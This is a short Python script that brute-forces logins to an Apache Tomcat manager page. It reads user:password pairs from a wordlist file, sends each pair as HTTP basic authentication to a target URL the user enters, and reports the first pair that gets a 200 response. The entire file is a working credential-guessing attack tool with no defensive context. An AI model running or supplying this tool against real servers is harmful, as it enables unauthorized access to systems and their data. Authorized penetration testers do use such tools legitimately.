#!/usr/bin/env python

import sys
import requests
from pip._vendor.distlib.compat import raw_input

wdlistdir = input("Enter file location and name, ie., ~\Tempfile.txt of password list: ")
baseURL = raw_input("Enter base hostname or IP (starting with http/s) of TomCat manager: ")
URL = raw_input("Enter URL extensions (/admin/html) for TomCat manager: ")

try:
    requests.get(baseURL, timeout=4)
except requests.exceptions.RequestException:
    print("Web page appears to be offline or incorrect")
    sys.exit(1)


with open(wdlistdir) as f:
    for line in f:
        c = line.strip('\n').split(":")
        r = requests.get(baseURL + URL, auth=(c[0], c[1]))
        if r.status_code == 200:
            print("Found valid credentials\"" + line.strip('\n') + "\"")
            raise sys.exit()


